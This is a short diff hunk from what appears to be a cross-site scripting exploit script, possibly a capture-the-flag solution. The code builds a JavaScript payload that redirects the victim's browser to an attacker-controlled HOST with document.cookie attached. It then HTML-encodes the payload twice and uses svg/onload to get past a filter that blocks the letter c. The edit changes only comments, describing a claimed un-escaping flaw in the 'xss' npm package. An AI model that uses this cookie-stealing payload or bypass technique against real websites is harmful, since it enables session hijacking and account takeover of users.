@@ -13,9 +13,9 @@ def html_encode(string):
 # javascript to steal the cookie and send it to an attacker controlled location
 payload = f"document.location='{HOST}/?c='+document.cookie"
 
-# double html encode the payload to bypass the filter which replaces any c's.
+# html encode the payload twice to bypass the blacklist filter for c's.
 # this works because the `xss` npm package has a documented issue where it
-# escapes whitelisted tags and doesn't re-escape them
+# un-escapes whitelisted tags and doesn't re-escape them
 payload = html_encode(html_encode(payload))
 
 # use svg/onload rather than script/src in order to bypass the same c filter
